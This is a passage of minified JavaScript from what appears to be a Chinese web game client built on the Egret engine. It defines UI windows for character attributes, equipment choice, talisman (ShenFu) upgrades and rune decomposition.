t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return d.OpenSystem.ins().checkSysShow(s.SystemType.DEMON_CIR)},e}(n.BaseView);e.DemonAndWingPanel=g,window.DemonAndWingPanel=g,__reflect(g.prototype,"DemonAndWingPanel",[]),window.DemonAndWingPanel=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.JingMaiMain=void 0;var n=i(1),o=i(4),s=i(6),a=i(134),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="JinMaiMainSkin",e}return __extends(e,t),e.prototype.addDisplay=function(t){this.initTab(),observe(this,this.updateTabRed,o.ActorCC.postPowerChange),observe(this,this.updateTabRed,o.ActorCC.postGoldChange),observe(this,this.updateTabRed,s.BagCT.ins().postItemAdd)},e.prototype.initTab=function(){},e.prototype.updateTabRed=function(){this.eTab.updateReds()},e.prototype.tabRp=function(){return a.JingMaiCT.ins().rp.v},e}(n.BaseView);e.JingMaiMain=r,window.JingMaiMain=r,__reflect(r.prototype,"JingMaiMain",[]),window.JingMaiMain=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LianTiBlessWin=void 0;var n=i(19),o=i(1),s=i(0),a=i(12),r=i(52),l=i(134),h=i(1139),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="LianTiBlessWinSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=h.LianTiBlessItem,this.list.dataProvider=this.listArr=new eui.ArrayCollection,this.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this)},e.prototype.addDisplay=function(){this.updateView()},e.prototype.updateView=function(){var t=l.JingMaiCT.ins().liantiDataList;this.listArr.replaceAll(t);var e=s.GlobalConfig.WeekLimitedStore[45];if(e){var i=a.OpenSystem.ins().checkSysOpen(e.openSystem),n=r.Shop.ins().getWeekNumById(e.index)>=e.Maxcount;this.goGetBtn.visible=i&&!n}},e.prototype.onClick=function(t){switch(t.target){case this.goGetBtn:n.GlobalFun.jumpLink(s.GlobalConfig.LiantiBaseConfig.guide)}},e}(o.BaseView);e.LianTiBlessWin=u,window.LianTiBlessWin=u,__reflect(u.prototype,"LianTiBlessWin",[]),window.LianTiBlessWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LianTiBlessItem=void 0;var n=i(3),o=i(0),s=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){if(this.data){t.prototype.dataChanged.call(this);var e=this.data,i=o.GlobalConfig.LiantiTypeConfig[e.type];this.icon.source=i.icon,this.progressBar.maximum=o.GlobalConfig.LiantiBaseConfig.maxLuck,this.progressBar.value=e.curBless;var n=o.GlobalConfig.LiantiBaseConfig;e.curBless>=o.GlobalConfig.LiantiBaseConfig.maxLuck?this.att.text="100%":this.att.text=n.percent/100+"%+"+Math.floor(e.curBless/n.addPercent.x)*n.addPercent.y/100+"%"}},e}(n.BaseItemRender);e.LianTiBlessItem=s,window.LianTiBlessItem=s,__reflect(s.prototype,"LianTiBlessItem",[]),window.LianTiBlessItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LianTiSuitWin=void 0;var n=i(1),o=i(134),s=i(500),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="LianTiSuitWinSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList0.itemRenderer=s.LianTiSuitItem,this.eList0.dataProvider=this.eList0Arr=new eui.ArrayCollection,observe(this,this.updateView,o.JingMaiCT.ins().postLianTiUpdate)},e.prototype.addDisplay=function(){this.updateView()},e.prototype.updateView=function(){this.eList0Arr.replaceAll([1,2])},e}(n.BaseView);e.LianTiSuitWin=a,window.LianTiSuitWin=a,__reflect(a.prototype,"LianTiSuitWin",[]),window.LianTiSuitWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LianTiLevelItem=void 0;var n=i(42),o=i(5),s=i(3),a=i(22),r=i(134),l=i(500),h=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){if(this.data){t.prototype.dataChanged.call(this);var e=this.data,i=new a.AttributeData;i.type=e.att[0][0],i.value=e.att[0][1];var s=a.AttributeData.getAttrValStr(i),h=15329769,u=a.AttributeData.getAttrStrByType(e.att[0][0]),p=u;2==u.length&&(p=n.StringUtils.complementByChar(u[0],9)+u[1]),this.att.textFlow=o.TextFlowMaker.generateTextFlow("|C:"+h+"&T:"+s+"|"),e.type==l.LianTiSuitItem.LIANTISUIT_TYPE_MIN?(this.eName.text=gettext("最低等级为{0}级：",e.lv),r.JingMaiCT.ins().getMaxLiantiAtt(!1)==e.lv?this.currentState="down":this.currentState="up",this.eVal.text=p+" +"):e.type==l.LianTiSuitItem.LIANTISUIT_TYPE_MAX&&(this.eName.text=gettext("最高等级为{0}级：",e.lv),r.JingMaiCT.ins().getMaxLiantiAtt(!0)==e.lv?this.currentState="down":this.currentState="up",this.eVal.text=p+"  +")}},e}(s.BaseItemRender);e.LianTiLevelItem=h,window.LianTiLevelItem=h,__reflect(h.prototype,"LianTiLevelItem",[]),window.LianTiLevelItem=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RoleAttrPanel=void 0;var n=i(1143),o=i(0),s=i(1),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="RoleAttrSkin",e.layoutNum=LayoutNum.top,e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=n.RoleAttViewItem,this.arc=new eui.ArrayCollection,this.eList.dataProvider=this.arc},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.eCloseBtn,this.onClick),this.setRoleData(t[0])},e.prototype.setRoleData=function(t){this.role=t,this.update()},e.prototype.update=function(){return __awaiter(this,void 0,void 0,function(){var t,e,i,n;
return __generator(this,function(s){switch(s.label){case 0:return this.skin&&this.role?[4,sendSync(Ts.getRoleAtts,this.role.index)]:[2];case 1:for(t=s.sent().atts,e=[],i=o.GlobalConfig.ClientGlobalConfig.showAttrs,n=0;n<i.length;n++)e.push([n,t]);return this.arc.replaceAll(e),[2]}})})},e.prototype.onClick=function(){win.close(this)},e}(s.BaseView);e.RoleAttrPanel=a,window.RoleAttrPanel=a,__reflect(a.prototype,"RoleAttrPanel",[]),window.RoleAttrPanel=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RoleAttViewItem=void 0;var n=i(3),o=i(1144),s=i(0),a=i(22),r=i(42),l=i(34),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="RoleAttrPanelSkin",e.titleArr=[gettext("基础属性"),gettext("高级属性"),gettext("特殊属性")],e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=o.RoleAttrItem,this.eList.dataProvider=new eui.ArrayCollection([])},e.prototype.dataChanged=function(){if(this.Titlelab.text=this.titleArr[this.itemIndex],this.data&&this.data instanceof Array&&2==this.data.length){var t=this.data[0],e=this.data[1],i=[],n=s.GlobalConfig.ClientGlobalConfig.showAttrs[t],o=new a.AttributeData,h="",u="";for(var p in n){var d=n[p],c=a.AttributeData.getAttrStrByType(d),f=c;2==c.length&&(f=r.StringUtils.complementByChar(c[0],9)+c[1]);var g=e[d];o.type=d,o.value=g;var m=a.AttributeData.getAttrValStr(o),v=15329769;d==l.AttributeType.atAtkMin||d==l.AttributeType.atAtkMageMin||d==l.AttributeType.atAtkTaoistMin||d==l.AttributeType.atDef?(u=f+"：",h="|C:"+v+"&T:"+m+"|"):d==l.AttributeType.atAtkMax||d==l.AttributeType.atAtkMageMax||d==l.AttributeType.atAtkTaoistMax||d==l.AttributeType.atRes?(h+="|C:"+v+"&T:-"+m+"|",i.push([u,h]),h="",u=""):i.push([f+"：","|C:"+v+"&T:"+m+"|"])}this.eList.dataProvider=new eui.ArrayCollection(i)}},e}(n.BaseItemRender);e.RoleAttViewItem=h,window.RoleAttViewItem=h,__reflect(h.prototype,"RoleAttViewItem",[]),window.RoleAttViewItem=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RoleAttrItem=void 0;var n=i(3),o=i(5),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="RoleAttrItemSkin",e}return __extends(e,t),e.prototype.dataChanged=function(){this.data&&this.data instanceof Array&&2==this.data.length&&(this.eName.text=this.data[0],this.eVal.textFlow=o.TextFlowMaker.generateTextFlow(this.data[1]))},e}(n.BaseItemRender);e.RoleAttrItem=s,window.RoleAttrItem=s,__reflect(s.prototype,"RoleAttrItem",[]),window.RoleAttrItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RoleChooseEquipWin=void 0;var n=i(1),o=i(39),s=i(4),a=i(13),r=i(6),l=i(40),h=i(10),u=i(2),p=i(26),d=i(1146),c=i(38),f=i(24),g=i(0),m=i(62),v=i(478),y=i(80),C=i(59),T=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="RoleChooseEquipSkin",e.itemList=[],e.pos=0,e.itemType=0,e.roleSelect=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=d.RoleEquipChooseItem,this.wearItem=new d.RoleEquipChooseItem,this.itemGroup.addChild(this.wearItem)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.roleSelect=t[0],this.pos=t[1],this.itemType=t[2]?t[2]:0;var i,n=a.SubRoles.ins().getSubRoleByIndex(this.roleSelect);switch(this.itemType){case o.ItemType.TYPE_56:var s=t[3];this.itemList=[];var l=y.TotemCT.ins().getCurPosTotem(this.pos,s);for(var u in l){var p=l[u].copy();this.itemList.push(p)}break;default:this.itemList=r.BagCT.ins().getEquipByPos(this.roleSelect,this.pos);var d=n.getEquipDataByPos(this.pos);d&&(i=d.item)}this.wearItem.setUpImage(!1),this.wearItem.data=i,this.wearItem.setBtnStatu();var f=0;if(i&&0!=i.configID){this.scroll.y=170,this.scroll.height=400,this.wearItem.visible=!0,f=i.point;var m=0==h.ItemUtil.getJob(i.itemConfig)?n.job:h.ItemUtil.getJob(i.itemConfig);r.BagCT.ins().setEquipPowerDic(m,h.ItemUtil.getSubType(i.itemConfig),f)}else this.scroll.y=50,this.scroll.height=520,this.wearItem.visible=!1;this.list.dataProvider=new eui.ArrayCollection(this.itemList),this.list.validateNow(),this.btnGold.visible=this.isTj()||this.isAnimals(),this.btnGold.eRp&&(this.isTj()?this.btnGold.eRp.visible=c.EquipCT.ins().checkTjRpByPos(this.pos):this.isAnimals()&&(this.btnGold.eRp.visible=c.EquipCT.ins().checkAnimalsRpByPos(this.pos))),this.eTips.visible=!this.btnGold.visible&&this.itemList.length<=0,this.eTips.visible&&this.itemType==o.ItemType.TYPE_56&&t[3]&&(this.otherETips.visible=!0,this.otherETips.text=g.GlobalConfig.TotemUnitConfig[t[3]].name+"."+y.TotemCT.ins().returnTotemConfig(this.pos,t[3]).name),this.btnGold.y=this.btnGold.visible?this.scroll.height+60:this.scroll.height,this.imgBg.height=this.btnGold.y+80,observe(this,this.closeThis,c.EquipCT.ins().postEquipChange),this.addTouchEvent(this,this.itemTap),this.addTouchEvent(this.btnGold,this.onClick)},e.prototype.closeThis=function(){win.close(this)},e.prototype.xinmoItemListSort=function(t,e){if(t.point<e.point)return 1;if(t.point>e.point)return-1;var i=h.ItemUtil.getFmCount(t),n=h.ItemUtil.getFmCount(e);return n>i?1:i>n?-1:0},e.prototype.itemTap=function(t){return __awaiter(this,void 0,void 0,function(){var e,i,n;return __generator(this,function(a){switch(a.label){case 0:return"changeBtn"!=t.target.name?[3,4]:(e=t.target.parent.data,e&&e instanceof l.ItemData?(this.itemType==o.ItemType.TYPE_33,this.itemType!=o.ItemType.TYPE_56?[3,1]:(y.TotemCT.ins().sendMergeItem(e.configID),[3,3])):[3,4]);case 1:return i=s.ActorCC.level,n=p.ZsCT.ins().stage,!e.itemConfig||n>=(e.itemConfig.zsLevel||0)&&i>=(e.itemConfig.level||1)?[4,sendSync(Ts.WearEquip,{handle:e.handle,pos:this.pos,roleId:this.roleSelect})]:5==e.quality?(u.TipsCT.ins().showTips(gettext("|C:0xF3311E&T:{0}）达到{1}转{2}级可穿戴|",e.itemConfig.name,e.itemConfig.zsLevel,e.itemConfig.level||1)),n<e.itemConfig.zsLevel&&C.GameFlashSaleCt.ins().reportZsLvNot(),i<(e.itemConfig.level||1)&&C.GameFlashSaleCt.ins().reportLvNot(),[2]):(u.TipsCT.ins().showTips(gettext("|C:0xF3311E&T:等级不足，无法穿戴|")),n<e.itemConfig.zsLevel&&C.GameFlashSaleCt.ins().reportZsLvNot(),i<(e.itemConfig.level||1)&&C.GameFlashSaleCt.ins().reportLvNot(),[2]);case 2:a.sent(),a.label=3;case 3:win.close(this),a.label=4;case 4:return[2]}})})},e.prototype.onClick=function(t){switch(t.currentTarget){case this.btnGold:var e=c.EquipCT.ins().getDescCfgIdByType(this.itemType,this.pos);if(!e)return;var i=f.CommonUtils.getObjectByAttr(g.GlobalConfig.ItemConfig,"descIndex",e),n=100*Math.floor((null===i||void 0===i?void 0:i.id)/100);this.isAnimals()?win.open("ComposeTip",v.ComposeTip.ANIMALS_COMPOSE_ID,this.pos):win.open("ComposeTip",n,this.pos),win.close(this)}},e.prototype.isTj=function(){return this.pos&&this.pos<=m.EquipPos.EquipType_SecretRecord&&this.pos>=m.EquipPos.PowerRing||this.pos<=m.EquipPos.Bugle&&this.pos>=m.EquipPos.Spell?!0:!1},e.prototype.isAnimals=function(){return this.pos&&this.pos>=m.EquipPos.AnimalsRat&&this.pos<=m.EquipPos.AnimalsPig?!0:!1},e}(n.BaseView);e.RoleChooseEquipWin=T,window.RoleChooseEquipWin=T,__reflect(T.prototype,"RoleChooseEquipWin",[]),window.RoleChooseEquipWin=T},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RoleEquipChooseItem=void 0;var n=i(5),o=i(22),s=i(39),a=i(4),r=i(13),l=i(6),h=i(10),u=i(62),p=i(26),d=i(3),c=i(34),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="RoleChooseEquipItemSkin",e.showUpimage=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this._isBtnStatu&&this.setBtnStatu()},e.prototype.dataChanged=function(){if(this.data&&this.data.itemConfig){this.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.onRemove,this);var t,e,i=this.data,d=h.ItemUtil.getType(this.data.itemConfig);d==s.ItemType.TYPE_36?(this.itemIcon.visible=!1,t=l.BagCT.ins().getEquipAttrs(this.data),e=this.data.point):d==s.ItemType.TYPE_41?(this.itemIcon.visible=!0,this.itemIcon.data=this.data,e=h.ItemUtil.getAttrPower(t)):(this.itemIcon.visible=!0,this.itemIcon.data=this.data,t=l.BagCT.ins().getEquipAttrs(this.data),e=this.data.point),this.power.text=gettext("评分：{0}",e);var f=h.ItemUtil.getSubType(this.data.itemConfig),g=a.ActorCC.level>=(this.data.itemConfig.level||1)&&p.ZsCT.ins().stage>=(this.data.itemConfig.zsLevel||0),m=g?"0x35E62D":"0xfe4444";if(d==s.ItemType.TYPE_34)this.levelStrText.text=gettext("品质:");else if(f==u.EquipPos.DZI)this.levelStrText.text=gettext("等阶:"),this.levelText.text=l.BagCT.ins().getGuanyinLevel(i.itemConfig);else if(d==s.ItemType.TYPE_36)this.levelStrText.text=gettext("阶级:");else if(d==s.ItemType.TYPE_41)this.levelStrText.text=gettext("品质:");else{this.levelStrText.text=gettext("等级:");var v=isNaN(this.data.itemConfig.zsLevel)?gettext("{0}级",this.data.itemConfig.level||1):gettext("{0}转",this.data.itemConfig.zsLevel);this.levelText.textFlow=n.TextFlowMaker.generateTextFlow("|C:"+m+"&T:"+v+"|")}var y=0;if(this.now.visible=!this.showUpimage,this.data.itemConfig.job)y=h.ItemUtil.getJob(this.data.itemConfig);else{var C=win.get("RoleChooseEquipWin"),T=C.roleSelect,b=r.SubRoles.ins().getSubRoleByIndex(T);y=b.job}var w=l.BagCT.ins().getEquipPowerDic(y,f);if(e>w&&this.showUpimage&&g){this.upImg.visible=!0;var I=egret.Tween.get(this.upImg,{loop:!0});I.to({y:this.upImg.y-3},250).to({y:this.upImg.y+3},250)}else this.upImg.visible=!1;0==this.itemIndex&&this.showUpimage&&g&&e>w?this.best.visible=!0:this.best.visible=!1;for(var _="",S=0;S<t.length;S++){var x=t[S].type;if(0!=t[S].type){var v=o.AttributeData.getAttrNameByAttrbute(t[S],!0," ");x==c.AttributeType.atAtkMin||x==c.AttributeType.atAtkMageMin||x==c.AttributeType.atAtkTaoistMin||x==c.AttributeType.atDef?_=_+v+" -":_+=v+"\n"}}this.attr1.textFlow=(new egret.HtmlTextParser).parser(_),p.ZsCT.ins().stage<(this.data.itemConfig.zsLevel||0)||a.ActorCC.level<(this.data.itemConfig.level||1)?this.changeBtn.visible=!1:this.changeBtn.visible=!this._isBtnStatu}},e.prototype.onRemove=function(){this.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.onRemove,this),egret.Tween.removeTweens(this.upImg)},e.prototype.setUpImage=function(t){this.showUpimage=t},e.prototype.setBtnStatu=function(){this._isBtnStatu=!0,this.changeBtn&&(this.changeBtn.visible=!1,this.now.visible=!0)},e}(d.BaseItemRender);e.RoleEquipChooseItem=f,window.RoleEquipChooseItem=f,__reflect(f.prototype,"RoleEquipChooseItem",[]),window.RoleEquipChooseItem=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RoleWin=void 0;var n=i(16),o=i(1),s=i(17),a=i(4),r=i(6),l=i(155),h=i(263),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.oneLevelWin=!0,e._sn_="RoleWinSkin",e.panelArr=[],e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];if(this.param=t,this.initTab(),this.open(),observe(this,this.updateTabRed,a.ActorCC.postPowerChange),observe(this,this.updateTabRed,a.ActorCC.postGoldChange),observe(this,this.updateTabRed,r.BagCT.ins().postItemAdd),observe(this,this.updateTabRed,r.BagCT.ins().postItemDel),observe(this,this.updateTabRed,r.BagCT.ins().postItemChange),observe(this,this.updateTabRed,s.RedPointBaseSys.ins().RpChange),observe(this,this.updateTabRed,l.DemonCirRedPoint.ins().postRedPoint),observe(this,this.updateTabRed,h.WingRedPoint.ins().postRedPoint),!this.panelArr||!this.panelArr.length){this.panelArr=[];for(var i=0;i<this.eVs.numChildren;i++){var n=this.eVs.getChildAt(i),o=egret.getQualifiedClassName(n);this.panelArr[i]=o}}},e.prototype.initTab=function(){if(this.skin)for(var t=this.eVs.numChildren-1;t>=0;t--){var e=this.eVs.getChildAt(t),i=egret.getQualifiedClassName(e);win.showCheck(egret.getDefinitionByName(i))||this.eVs.removeChildAt(t)}},e.prototype.removeDisplay=function(){if(this.skin){if(this.removeObserve(),this.eVs&&this.eVs.numElements>0)for(var t=this.eVs.numElements-1;t>=0;t--){var e=this.eVs.getElementAt(t);e&&n.DisplayUtils.removeFromParent(e)}n.DisplayUtils.removeFromParent(this.eVs),n.DisplayUtils.removeFromParent(this.eTab)}},e.prototype.open=function(){var t=this.param[0]||0,e=this.panelArr[t]||egret.getQualifiedClassName(this.eVs.getChildAt(t));if(win.openCheck(egret.getDefinitionByName(e))){t=0;for(var i=0;i<this.eVs.numChildren;i++){var n=this.eVs.getChildAt(i),o=egret.getQualifiedClassName(n);if(o==e){t=i;break}}}else t=0;if(this.eVs.selectedIndex=t,0==this.eTab.selectedIndex){var s=this.eVs.getElementAt(this.eVs.selectedIndex);if(!s)return;s.openIdx=this.param[1]||0}},e.prototype.updateTabRed=function(){this.eTab.updateReds()},e.prototype.GuideShenBing=function(){var t=this.eTab.getElementAt(2);if(t)return t},e}(o.BaseView);e.RoleWin=u,window.RoleWin=u,__reflect(u.prototype,"RoleWin",[]),window.RoleWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShenFuTip=void 0;var n=i(1),o=i(17),s=i(11),a=i(0),r=i(6),l=i(59),h=i(2),u=i(123),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ShenFuEquipUpTipSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=s.ItemBase,this.list.dataProvider=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){this.addTouchEvent(this.btn1,this.onClick),this.addTouchEvent(this.btn2,this.onClick),this.addTouchEvent(this.btn3,this.onClick),observe(this,this.redRefresh,o.RedPointBaseSys.ins().RpChange),observe(this,this.updateView,u.ShenFuCT.ins().doUpdateLv),void 0==u.ShenFuCT.ins().getShenFuLv()&&u.ShenFuCT.ins().sendShenFuInfo(),this.updateView(),this.redRefresh()},e.prototype.redRefresh=function(){this.showRed.visible=u.ShenFuCT.ins().upRed.v},e.prototype.updateView=function(){var t=u.ShenFuCT.ins().getShenFuLv();this.currentState=t?"uplevel":"awake",this.curLv.text=t?gettext("神符Lv.{0}",t):"";var e=a.GlobalConfig.TalismanConfig[t],i=a.GlobalConfig.TalismanConfig[t+1];this.nextLv.text=i?gettext("神符Lv.{0}",t+1):gettext("神符Lv.{0}",t),this.btn2.visible=i?!0:!1,i||(this.currentState="maxlevel");var n="";"awake"==this.currentState?n="Role_itemsuo":(n="",this.list.dataProvider=new eui.ArrayCollection(e.cost||[]),this.list.validateNow(),this.setListItem()),this.curItemIcon.setItemImg(n),this.nextItemIcon.setItemImg(""),(null===e||void 0===e?void 0:e.eff)&&this.curItemIcon.setItemEff2(e.eff),(null===i||void 0===i?void 0:i.eff)&&this.nextItemIcon.setItemEff2(i.eff),this.curItemIcon.setStr(t?gettext("神符Lv.{0}",t):""),this.nextItemIcon.setStr(i?gettext("神符Lv.{0}",t+1):gettext("神符Lv.{0}",t))},e.prototype.setListItem=function(){for(var t,e=0;e<this.list.numElements;e++){var i=this.list.getElementAt(e),n=r.BagCT.ins().getBagGoodsCountById(r.BagCT.BAG_TYPE_OTHTER,i.data.id)||0,o=i.data.count,s=(null===(t=a.GlobalConfig.ItemConfig[i.data.id])||void 0===t?void 0:t.name)||"",l=n>=o?4247574:16720161;i.setCount("");var h=s+"\n|C:"+l+"&T:"+n+"|C:14537649&T:/"+o;i.setName(h)}},e.prototype.onClick=function(t){switch(t.target){case this.btn1:win.close(this);break;case this.btn2:var e=u.ShenFuCT.ins().getShenFuLv();if(e){var i=a.GlobalConfig.TalismanConfig[e],n=(null===i||void 0===i?void 0:i.cost)||[];if(!n)return;for(var o=0;o<n.length;o++)if(r.BagCT.ins().getBagGoodsCountById(r.BagCT.BAG_TYPE_OTHTER,n[o].id)<n[o].count)return h.TipsCT.ins().showTips(gettext("道具不足")),void l.GameFlashSaleCt.ins().reportShenFuMaterialNot();u.ShenFuCT.ins().sendShenFuUp()}else u.ShenFuCT.ins().sendShenFuUp();break;case this.btn3:win.close(this)}},__decorate([delayCall(100)],e.prototype,"redRefresh",null),__decorate([delayCall(100)],e.prototype,"updateView",null),__decorate([callDelay(100)],e.prototype,"setListItem",null),e}(n.BaseView);e.ShenFuTip=p,window.ShenFuTip=p,__reflect(p.prototype,"ShenFuTip",[]),window.ShenFuTip=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShenFuWin=void 0;var n=i(5),o=i(1),s=i(22),a=i(34),r=i(17),l=i(0),h=i(10),u=i(123),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ShenFuEquipTipsSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){this.addTouchEvent(this.goBtn,this.onClick),observe(this,this.updateView,u.ShenFuCT.ins().doUpdateLv),observe(this,this.updateBtnRp,r.RedPointBaseSys.ins().RpChange),void 0==u.ShenFuCT.ins().getShenFuLv()&&u.ShenFuCT.ins().sendShenFuInfo(),this.updateView(),this.updateBtnRp()},e.prototype.updateBtnRp=function(){this.goBtn&&this.goBtn.eRp&&(this.goBtn.eRp.visible=u.ShenFuCT.ins().upRed.v)},e.prototype.updateView=function(){var t=u.ShenFuCT.ins().getShenFuLv(),e=l.GlobalConfig.TalismanConfig[t],i=t?"":"Role_itemsuo";this.txtType.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("类型：|C:0xFFD9B5&T:{0}|",gettext("神符"))),this.txtJob.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("职业：|C:0x10FF00&T:{0}|",gettext("通用"))),this.txtQua.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("品质：|C:0x10FF00&T:{0}|",gettext("传说"))),this.lvLab.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("等级：|C:0x10FF00&T:{0}级|",t)),this.itemIcon.setItemImg(i),t&&(null===e||void 0===e?void 0:e.eff)&&this.itemIcon.setItemEff2(e.eff),this.itemIcon.setStr(t?gettext("神符Lv.{0}",t):""),this.powLab.text=gettext("战力：")+h.ItemUtil.getAttrPower((null===e||void 0===e?void 0:e.attr)||[]),this.updateAttr(),this.updateList(),this.lab.text=gettext("离线泡点时间：8小时"),this.eBtnGroup.visible=l.GlobalConfig.TalismanConfig[t+1]&&e.cost?!0:!1},e.prototype.updateAttr=function(){for(var t=u.ShenFuCT.ins().getShenFuLv(),e=l.GlobalConfig.TalismanConfig[t],i=(null===e||void 0===e?void 0:e.attr)||[],n=0,o="",r=0;r<i.length;r++){var h=i[r].type;h==a.AttributeType.atExp?n+=i[r].value||0:(s.AttributeData.getAttrStrByType(h)&&(o+=s.AttributeData.getAttrStrByType(h)+": "),o+=h==a.AttributeType.atAtkMin||h==a.AttributeType.atAtkMageMin||h==a.AttributeType.atAtkTaoistMin||h==a.AttributeType.atDef?s.AttributeData.getAttrValStr(i[r])+" - ":s.AttributeData.getAttrValStr(i[r])+"\n")}this.attr1.text=o,this.attr2.text=gettext("泡点经验+")+(n||0)},e.prototype.updateList=function(){var t,e=l.GlobalConfig.TalismanConfig,i=u.ShenFuCT.ins().getShenFuLv(),n="";for(var o in e)if(e[o].level%10==0){var s=i>=e[o].level?4247574:11645079;n+='<font color="'+s+'"> '+(null===(t=e[o])||void 0===t?void 0:t.desc)+"</font>\n"}this.attr3.textFlow=(new egret.HtmlTextParser).parser(n)},e.prototype.onClick=function(t){switch(t.target){case this.goBtn:win.open("ShenFuTip")}},e}(o.BaseView);e.ShenFuWin=p,window.ShenFuWin=p,__reflect(p.prototype,"ShenFuWin",[]),window.ShenFuWin=p},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RuneDecomposePanel=void 0;var n=i(1),o=i(502),s=i(23),a=i(2),r=i(108),l=i(10),h=i(27),u=i(4),p=i(6),d=i(0),c=i(31),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DecomposeruneSkin",e.cardCollection=null,e._addNum=0,e._chipNum=0,e.cbArr=[],e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=0;this["cb"+t];)this.cbArr.push(this["cb"+t]),t++;for(var e=0,i=this.cbArr;e<i.length;e++){var n=i[e];this.addTouchEvent(n,this.onCBTap)}this.addTouchEvent(this.eBtn,this.onTap),this.addEvent(eui.ItemTapEvent.ITEM_TAP,this.eList,this.onListTap),observe(this,this.updateShatter,s.GameLogic.ins().postRuneShatter),observe(this,this.updateShatter,s.GameLogic.ins().postRuneExchange),this.initCardList(),this.resetCheckBox(),this.updateShatter()},e.prototype.onListTap=function(t){var e=this.eList.selectedItem;e.isSelected=!e.isSelected,this.cardCollection.itemUpdated(e),this.eList.selectedIndex=-1,this.updateShatter()},e.prototype.onTap=function(t){if(t&&t.currentTarget)switch(t.currentTarget){case this.eBtn:this.decomposeRune()}},e.prototype.decomposeRune=function(){var t=this;if(!this.cardList||!this.cardList.length)return void a.TipsCT.ins().showTips(gettext("当前无选择任何战纹"));for(var e=!1,i=[],n=0,o=this.cardList;n<o.length;n++){var s=o[n];if(s&&s.isSelected&&s.itemData&&s.itemData.itemConfig){i.push(s.itemData);var u=s.itemData.itemConfig;l.ItemUtil.getQuality2(u)>=r.RuneConfigMgr.ins().getOtherCfg().maxQuality&&(e=!0)}}if(e){var p="",d="",f="";e&&(d="<font color = '"+c.QUALITY_COLOR[r.RuneConfigMgr.ins().getOtherCfg().maxQuality]+"' size = '22'>顶级战纹</font>");var g=p+f+d,m=gettext("当前分解战纹包括")+g+gettext("，是否继续进行分解");h.WarnWin.show(m,function(){return t.sendDecompose(i)},this)}else this.sendDecompose(i)},e.prototype.sendDecompose=function(t){return __awaiter(this,void 0,void 0,function(){var e;return __generator(this,function(i){switch(i.label){case 0:return[4,sendSync(Ts.decomposeRune,t)];case 1:return(e=i.sent().result)?(this._addNum&&a.TipsCT.ins().showTips(gettext("分解成功，|C:0x35e62d&T:战纹精华x{0}|",this._addNum)),this._chipNum&&a.TipsCT.ins().showTips(gettext("分解成功，|C:0x35e62d&T:战纹碎片x{0}|",this._chipNum)),this.initCardList(),this.updateShatter(),[2]):(a.TipsCT.ins().showTips(gettext("分解失败，请稍后再试")),[2])}})})},e.prototype.onCBTap=function(t){var e=t.currentTarget,i=this.cbArr.indexOf(e);this.setQualitySelected(i+1,e.selected),this.updateShatter()},e.prototype.updateShatter=function(){var t=0,e=0,i=0;if(this.cardList&&this.cardList.length>0)for(var n=0,o=this.cardList;n<o.length;n++){var 